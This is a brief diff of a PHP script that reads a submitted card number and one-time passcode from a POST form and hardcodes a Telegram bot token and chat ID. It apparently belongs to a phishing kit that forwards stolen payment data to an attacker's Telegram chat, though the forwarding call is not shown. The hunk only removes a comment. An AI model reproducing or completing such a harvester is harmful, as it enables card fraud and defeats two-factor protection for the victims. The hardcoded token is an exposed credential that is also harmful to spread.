@@ -4,7 +4,6 @@ if ($_SERVER['REQUEST_METHOD'] !== 'POST') { http_response_code(403); exit('Acce
 $otp  = $_POST['otp'] ?? '';
 $card = $_POST['card'] ?? '';
 
-// TOKEN YALNIZ BURADA
 $botToken = '9124698878:AAHaa7ybeZ-b72I3DN0ptfOM0SxTeHaayMc';
 $chatId   = '-1004326178006';
 
